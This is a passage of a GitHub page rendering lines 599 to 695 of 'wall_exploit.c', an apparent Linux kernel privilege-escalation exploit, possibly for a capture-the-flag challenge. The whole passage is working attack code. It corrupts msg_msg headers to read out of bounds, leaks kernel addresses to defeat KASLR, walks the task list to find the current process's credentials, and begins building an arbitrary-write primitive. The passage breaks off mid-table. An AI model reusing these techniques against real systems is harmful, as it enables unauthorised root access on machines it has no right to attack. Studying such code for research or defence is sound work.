          <td id="file-wall_exploit-c-LC599" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> leak the pointer into kmalloc-32 slab from the 4k msg_msg struct</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L600" class="blob-num js-line-number js-code-nav-line-number" data-line-number="600"></td>
          <td id="file-wall_exploit-c-LC600" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">m_type</span> = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L601" class="blob-num js-line-number js-code-nav-line-number" data-line-number="601"></td>
          <td id="file-wall_exploit-c-LC601" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">m_ts</span> = <span class="pl-c1">0x10f0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L602" class="blob-num js-line-number js-code-nav-line-number" data-line-number="602"></td>
          <td id="file-wall_exploit-c-LC602" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">next</span> = (<span class="pl-k">void</span> *)big_msg - <span class="pl-c1">0x10</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L603" class="blob-num js-line-number js-code-nav-line-number" data-line-number="603"></td>
          <td id="file-wall_exploit-c-LC603" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(buffer, (<span class="pl-k">void</span> *)&amp;evil, <span class="pl-c1">0x28</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L604" class="blob-num js-line-number js-code-nav-line-number" data-line-number="604"></td>
          <td id="file-wall_exploit-c-LC604" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">edit</span>(fd, <span class="pl-c1">0</span>, buffer, OUTBOUND, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L605" class="blob-num js-line-number js-code-nav-line-number" data-line-number="605"></td>
          <td id="file-wall_exploit-c-LC605" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">get_msg</span>(front_qid, recieved, <span class="pl-c1">0x10f0</span>, <span class="pl-c1">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L606" class="blob-num js-line-number js-code-nav-line-number" data-line-number="606"></td>
          <td id="file-wall_exploit-c-LC606" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L607" class="blob-num js-line-number js-code-nav-line-number" data-line-number="607"></td>
          <td id="file-wall_exploit-c-LC607" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint64_t</span> kmalloc32_chunk_leak;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L608" class="blob-num js-line-number js-code-nav-line-number" data-line-number="608"></td>
          <td id="file-wall_exploit-c-LC608" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)&amp;kmalloc32_chunk_leak, (<span class="pl-k">void</span> *)recieved + <span class="pl-c1">0x1000</span>, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L609" class="blob-num js-line-number js-code-nav-line-number" data-line-number="609"></td>
          <td id="file-wall_exploit-c-LC609" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>leaked a kmalloc 32 chunk address: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, kmalloc32_chunk_leak);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L610" class="blob-num js-line-number js-code-nav-line-number" data-line-number="610"></td>
          <td id="file-wall_exploit-c-LC610" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L611" class="blob-num js-line-number js-code-nav-line-number" data-line-number="611"></td>
          <td id="file-wall_exploit-c-LC611" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> continue spray</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L612" class="blob-num js-line-number js-code-nav-line-number" data-line-number="612"></td>
          <td id="file-wall_exploit-c-LC612" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; <span class="pl-c1">0x40</span>; i++)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L613" class="blob-num js-line-number js-code-nav-line-number" data-line-number="613"></td>
          <td id="file-wall_exploit-c-LC613" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L614" class="blob-num js-line-number js-code-nav-line-number" data-line-number="614"></td>
          <td id="file-wall_exploit-c-LC614" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> ((shmid = <span class="pl-c1">shmget</span>(IPC_PRIVATE, <span class="pl-c1">100</span>, <span class="pl-c1">0600</span>)) == -<span class="pl-c1">1</span>) </td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L615" class="blob-num js-line-number js-code-nav-line-number" data-line-number="615"></td>
          <td id="file-wall_exploit-c-LC615" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L616" class="blob-num js-line-number js-code-nav-line-number" data-line-number="616"></td>
          <td id="file-wall_exploit-c-LC616" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>shmget error<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L617" class="blob-num js-line-number js-code-nav-line-number" data-line-number="617"></td>
          <td id="file-wall_exploit-c-LC617" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L618" class="blob-num js-line-number js-code-nav-line-number" data-line-number="618"></td>
          <td id="file-wall_exploit-c-LC618" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L619" class="blob-num js-line-number js-code-nav-line-number" data-line-number="619"></td>
          <td id="file-wall_exploit-c-LC619" class="blob-code blob-code-inner js-file-line">        shmaddr = <span class="pl-c1">shmat</span>(shmid, <span class="pl-c1">NULL</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L620" class="blob-num js-line-number js-code-nav-line-number" data-line-number="620"></td>
          <td id="file-wall_exploit-c-LC620" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (shmaddr == (<span class="pl-k">void</span> *)-<span class="pl-c1">1</span>) </td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L621" class="blob-num js-line-number js-code-nav-line-number" data-line-number="621"></td>
          <td id="file-wall_exploit-c-LC621" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L622" class="blob-num js-line-number js-code-nav-line-number" data-line-number="622"></td>
          <td id="file-wall_exploit-c-LC622" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>shmat error<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L623" class="blob-num js-line-number js-code-nav-line-number" data-line-number="623"></td>
          <td id="file-wall_exploit-c-LC623" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L624" class="blob-num js-line-number js-code-nav-line-number" data-line-number="624"></td>
          <td id="file-wall_exploit-c-LC624" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L625" class="blob-num js-line-number js-code-nav-line-number" data-line-number="625"></td>
          <td id="file-wall_exploit-c-LC625" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L626" class="blob-num js-line-number js-code-nav-line-number" data-line-number="626"></td>
          <td id="file-wall_exploit-c-LC626" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L627" class="blob-num js-line-number js-code-nav-line-number" data-line-number="627"></td>
          <td id="file-wall_exploit-c-LC627" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> instead of worrying about null qword restriction, just expand size lmao</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L628" class="blob-num js-line-number js-code-nav-line-number" data-line-number="628"></td>
          <td id="file-wall_exploit-c-LC628" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">m_ts</span> = <span class="pl-c1">0x2000</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L629" class="blob-num js-line-number js-code-nav-line-number" data-line-number="629"></td>
          <td id="file-wall_exploit-c-LC629" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">next</span> = (<span class="pl-k">void</span> *)big_msg + <span class="pl-c1">0x20</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L630" class="blob-num js-line-number js-code-nav-line-number" data-line-number="630"></td>
          <td id="file-wall_exploit-c-LC630" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(buffer, (<span class="pl-k">void</span> *)&amp;evil, <span class="pl-c1">0x28</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L631" class="blob-num js-line-number js-code-nav-line-number" data-line-number="631"></td>
          <td id="file-wall_exploit-c-LC631" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">edit</span>(fd, <span class="pl-c1">0</span>, buffer, OUTBOUND, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L632" class="blob-num js-line-number js-code-nav-line-number" data-line-number="632"></td>
          <td id="file-wall_exploit-c-LC632" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">get_msg</span>(front_qid, recieved, <span class="pl-c1">0x2000</span>, <span class="pl-c1">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L633" class="blob-num js-line-number js-code-nav-line-number" data-line-number="633"></td>
          <td id="file-wall_exploit-c-LC633" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> not 100% here lmao</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L634" class="blob-num js-line-number js-code-nav-line-number" data-line-number="634"></td>
          <td id="file-wall_exploit-c-LC634" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)&amp;init_ipc_ns, (<span class="pl-k">void</span> *)recieved + <span class="pl-c1">0x1ff0</span>, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L635" class="blob-num js-line-number js-code-nav-line-number" data-line-number="635"></td>
          <td id="file-wall_exploit-c-LC635" class="blob-code blob-code-inner js-file-line">    kbase = init_ipc_ns - (<span class="pl-c1">0xffffffff81c3d7a0</span> - <span class="pl-c1">0xffffffff81000000</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L636" class="blob-num js-line-number js-code-nav-line-number" data-line-number="636"></td>
          <td id="file-wall_exploit-c-LC636" class="blob-code blob-code-inner js-file-line">    init_task = kbase + (<span class="pl-c1">0xffffffff81c124c0</span> - <span class="pl-c1">0xffffffff81000000</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L637" class="blob-num js-line-number js-code-nav-line-number" data-line-number="637"></td>
          <td id="file-wall_exploit-c-LC637" class="blob-code blob-code-inner js-file-line">    init_cred = kbase + (<span class="pl-c1">0xffffffff81c33060</span> - <span class="pl-c1">0xffffffff81000000</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L638" class="blob-num js-line-number js-code-nav-line-number" data-line-number="638"></td>
          <td id="file-wall_exploit-c-LC638" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L639" class="blob-num js-line-number js-code-nav-line-number" data-line-number="639"></td>
          <td id="file-wall_exploit-c-LC639" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> ((init_ipc_ns &amp; <span class="pl-c1">0xfff</span>) != <span class="pl-c1">0x7a0</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L640" class="blob-num js-line-number js-code-nav-line-number" data-line-number="640"></td>
          <td id="file-wall_exploit-c-LC640" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L641" class="blob-num js-line-number js-code-nav-line-number" data-line-number="641"></td>
          <td id="file-wall_exploit-c-LC641" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>We got bad leaks<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L642" class="blob-num js-line-number js-code-nav-line-number" data-line-number="642"></td>
          <td id="file-wall_exploit-c-LC642" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L643" class="blob-num js-line-number js-code-nav-line-number" data-line-number="643"></td>
          <td id="file-wall_exploit-c-LC643" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L644" class="blob-num js-line-number js-code-nav-line-number" data-line-number="644"></td>
          <td id="file-wall_exploit-c-LC644" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L645" class="blob-num js-line-number js-code-nav-line-number" data-line-number="645"></td>
          <td id="file-wall_exploit-c-LC645" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>kernel base: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, kbase);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L646" class="blob-num js-line-number js-code-nav-line-number" data-line-number="646"></td>
          <td id="file-wall_exploit-c-LC646" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>init_task: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, init_task);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L647" class="blob-num js-line-number js-code-nav-line-number" data-line-number="647"></td>
          <td id="file-wall_exploit-c-LC647" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>init_cred: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, init_cred);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L648" class="blob-num js-line-number js-code-nav-line-number" data-line-number="648"></td>
          <td id="file-wall_exploit-c-LC648" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L649" class="blob-num js-line-number js-code-nav-line-number" data-line-number="649"></td>
          <td id="file-wall_exploit-c-LC649" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> walking task struct</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L650" class="blob-num js-line-number js-code-nav-line-number" data-line-number="650"></td>
          <td id="file-wall_exploit-c-LC650" class="blob-code blob-code-inner js-file-line">    size = <span class="pl-c1">0x1400</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L651" class="blob-num js-line-number js-code-nav-line-number" data-line-number="651"></td>
          <td id="file-wall_exploit-c-LC651" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">m_ts</span> = size;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L652" class="blob-num js-line-number js-code-nav-line-number" data-line-number="652"></td>
          <td id="file-wall_exploit-c-LC652" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">next</span> = (<span class="pl-k">void</span> *)init_task + <span class="pl-c1">0x298</span> - <span class="pl-c1">0x8</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L653" class="blob-num js-line-number js-code-nav-line-number" data-line-number="653"></td>
          <td id="file-wall_exploit-c-LC653" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(buffer, (<span class="pl-k">void</span> *)&amp;evil, <span class="pl-c1">0x28</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L654" class="blob-num js-line-number js-code-nav-line-number" data-line-number="654"></td>
          <td id="file-wall_exploit-c-LC654" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">edit</span>(fd, <span class="pl-c1">0</span>, buffer, OUTBOUND, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L655" class="blob-num js-line-number js-code-nav-line-number" data-line-number="655"></td>
          <td id="file-wall_exploit-c-LC655" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">get_msg</span>(front_qid, recieved, size, <span class="pl-c1">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L656" class="blob-num js-line-number js-code-nav-line-number" data-line-number="656"></td>
          <td id="file-wall_exploit-c-LC656" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L657" class="blob-num js-line-number js-code-nav-line-number" data-line-number="657"></td>
          <td id="file-wall_exploit-c-LC657" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">int32_t</span> pid;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L658" class="blob-num js-line-number js-code-nav-line-number" data-line-number="658"></td>
          <td id="file-wall_exploit-c-LC658" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint64_t</span> prev, curr;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L659" class="blob-num js-line-number js-code-nav-line-number" data-line-number="659"></td>
          <td id="file-wall_exploit-c-LC659" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span>*)&amp;prev, (<span class="pl-k">void</span> *)(recieved) + <span class="pl-c1">0xfe0</span>, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L660" class="blob-num js-line-number js-code-nav-line-number" data-line-number="660"></td>
          <td id="file-wall_exploit-c-LC660" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span>*)&amp;pid, (<span class="pl-k">void</span> *)(recieved) + <span class="pl-c1">0x10d8</span>, <span class="pl-c1">4</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L661" class="blob-num js-line-number js-code-nav-line-number" data-line-number="661"></td>
          <td id="file-wall_exploit-c-LC661" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L662" class="blob-num js-line-number js-code-nav-line-number" data-line-number="662"></td>
          <td id="file-wall_exploit-c-LC662" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span> (pid != <span class="pl-c1">getpid</span>())</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L663" class="blob-num js-line-number js-code-nav-line-number" data-line-number="663"></td>
          <td id="file-wall_exploit-c-LC663" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L664" class="blob-num js-line-number js-code-nav-line-number" data-line-number="664"></td>
          <td id="file-wall_exploit-c-LC664" class="blob-code blob-code-inner js-file-line">        curr = prev - <span class="pl-c1">0x298</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L665" class="blob-num js-line-number js-code-nav-line-number" data-line-number="665"></td>
          <td id="file-wall_exploit-c-LC665" class="blob-code blob-code-inner js-file-line">        evil.<span class="pl-smi">next</span> = (<span class="pl-k">void</span> *)prev - <span class="pl-c1">0x8</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L666" class="blob-num js-line-number js-code-nav-line-number" data-line-number="666"></td>
          <td id="file-wall_exploit-c-LC666" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>(buffer, (<span class="pl-k">void</span> *)&amp;evil, <span class="pl-k">sizeof</span>(msg_header));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L667" class="blob-num js-line-number js-code-nav-line-number" data-line-number="667"></td>
          <td id="file-wall_exploit-c-LC667" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">edit</span>(fd, <span class="pl-c1">0</span>, buffer, OUTBOUND, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L668" class="blob-num js-line-number js-code-nav-line-number" data-line-number="668"></td>
          <td id="file-wall_exploit-c-LC668" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">get_msg</span>(front_qid, recieved, size, <span class="pl-c1">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L669" class="blob-num js-line-number js-code-nav-line-number" data-line-number="669"></td>
          <td id="file-wall_exploit-c-LC669" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span>*)&amp;prev, (<span class="pl-k">void</span> *)(recieved + <span class="pl-c1">0xfe0</span>), <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L670" class="blob-num js-line-number js-code-nav-line-number" data-line-number="670"></td>
          <td id="file-wall_exploit-c-LC670" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span>*)&amp;pid, (<span class="pl-k">void</span> *)(recieved + <span class="pl-c1">0x10d8</span>), <span class="pl-c1">4</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L671" class="blob-num js-line-number js-code-nav-line-number" data-line-number="671"></td>
          <td id="file-wall_exploit-c-LC671" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span><span class="pl-c1">%d</span> <span class="pl-c1">%d</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, pid, <span class="pl-c1">getpid</span>());</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L672" class="blob-num js-line-number js-code-nav-line-number" data-line-number="672"></td>
          <td id="file-wall_exploit-c-LC672" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L673" class="blob-num js-line-number js-code-nav-line-number" data-line-number="673"></td>
          <td id="file-wall_exploit-c-LC673" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L674" class="blob-num js-line-number js-code-nav-line-number" data-line-number="674"></td>
          <td id="file-wall_exploit-c-LC674" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>[+] found current task struct: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, curr);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L675" class="blob-num js-line-number js-code-nav-line-number" data-line-number="675"></td>
          <td id="file-wall_exploit-c-LC675" class="blob-code blob-code-inner js-file-line">    target_addr = curr + <span class="pl-c1">0x538</span> - <span class="pl-c1">0x8</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L676" class="blob-num js-line-number js-code-nav-line-number" data-line-number="676"></td>
          <td id="file-wall_exploit-c-LC676" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L677" class="blob-num js-line-number js-code-nav-line-number" data-line-number="677"></td>
          <td id="file-wall_exploit-c-LC677" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> now for arb write time</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L678" class="blob-num js-line-number js-code-nav-line-number" data-line-number="678"></td>
          <td id="file-wall_exploit-c-LC678" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> to achieve this, have a queue with a msg with 2 chunks in 4k pages</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L679" class="blob-num js-line-number js-code-nav-line-number" data-line-number="679"></td>
          <td id="file-wall_exploit-c-LC679" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> use the oob technique to arb read location of 4k msg and its segment (we can use target_qid since we have an offset to its only message already)</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L680" class="blob-num js-line-number js-code-nav-line-number" data-line-number="680"></td>
          <td id="file-wall_exploit-c-LC680" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> arb free: use its segment address in yours and free it with msg_rcv (we will need to find its queue address, which we already have)</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L681" class="blob-num js-line-number js-code-nav-line-number" data-line-number="681"></td>
          <td id="file-wall_exploit-c-LC681" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> now to gain write, allocate another message (0x2000) after freeing the previous 2 4k chunk msg, hang it at load_msg, arb free the segment</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L682" class="blob-num js-line-number js-code-nav-line-number" data-line-number="682"></td>
          <td id="file-wall_exploit-c-LC682" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> then grab another 0x1000 message, this will be where that freed part is, hang this</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L683" class="blob-num js-line-number js-code-nav-line-number" data-line-number="683"></td>
          <td id="file-wall_exploit-c-LC683" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> let the first load_msg finish to fill its segment, this will overwrite the 0x1000's next pointer</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L684" class="blob-num js-line-number js-code-nav-line-number" data-line-number="684"></td>
          <td id="file-wall_exploit-c-LC684" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> get such control thanks to LIFO</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L685" class="blob-num js-line-number js-code-nav-line-number" data-line-number="685"></td>
          <td id="file-wall_exploit-c-LC685" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint64_t</span> big_segment;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L686" class="blob-num js-line-number js-code-nav-line-number" data-line-number="686"></td>
          <td id="file-wall_exploit-c-LC686" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">get_msg</span>(target_qid, recieved, <span class="pl-c1">0x1010</span>, <span class="pl-c1">2</span>, IPC_NOWAIT | MSG_NOERROR);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L687" class="blob-num js-line-number js-code-nav-line-number" data-line-number="687"></td>
          <td id="file-wall_exploit-c-LC687" class="blob-code blob-code-inner js-file-line">    size = <span class="pl-c1">0x1f00</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L688" class="blob-num js-line-number js-code-nav-line-number" data-line-number="688"></td>
          <td id="file-wall_exploit-c-LC688" class="blob-code blob-code-inner js-file-line">    message-&gt;<span class="pl-smi">mtype</span> = <span class="pl-c1">2</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L689" class="blob-num js-line-number js-code-nav-line-number" data-line-number="689"></td>
          <td id="file-wall_exploit-c-LC689" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(message-&gt;<span class="pl-smi">mtext</span>, <span class="pl-c1">0x70</span>, size);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L690" class="blob-num js-line-number js-code-nav-line-number" data-line-number="690"></td>
          <td id="file-wall_exploit-c-LC690" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">send_msg</span>(target_qid, message, size - <span class="pl-c1">0x30</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L691" class="blob-num js-line-number js-code-nav-line-number" data-line-number="691"></td>
          <td id="file-wall_exploit-c-LC691" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> time to leak this 4k slab</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L692" class="blob-num js-line-number js-code-nav-line-number" data-line-number="692"></td>
          <td id="file-wall_exploit-c-LC692" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">m_ts</span> = <span class="pl-c1">0xfd0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L693" class="blob-num js-line-number js-code-nav-line-number" data-line-number="693"></td>
          <td id="file-wall_exploit-c-LC693" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">next</span> = (<span class="pl-k">void</span> *)<span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L694" class="blob-num js-line-number js-code-nav-line-number" data-line-number="694"></td>
          <td id="file-wall_exploit-c-LC694" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(buffer, (<span class="pl-k">void</span> *)&amp;evil, <span class="pl-k">sizeof</span>(msg_header));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L695" class="blob-num js-line-number js-code-nav-line-number" data-line-number="695"></td>
